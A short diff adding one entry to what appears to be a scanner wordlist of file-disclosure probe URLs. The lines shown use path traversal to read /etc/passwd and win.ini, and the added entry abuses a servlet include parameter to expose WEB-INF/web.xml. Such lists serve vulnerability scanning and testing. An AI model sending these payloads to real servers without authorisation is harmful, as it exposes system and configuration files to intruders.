@@ -873,3 +873,4 @@
 /tileserver.php/x/1/1/1?Format=/../../../../../../../../../../../../../../etc/passwd&Request=x&layer=.
 /download_work_dir_file?path=/etc/passwd
 /hx/resources/public/$SCHEMAS$?Filename=c%3a%5cwindows%5cwin.ini
+/h/rest?javax.servlet.include.servlet_path=/WEB-INF/web.xml
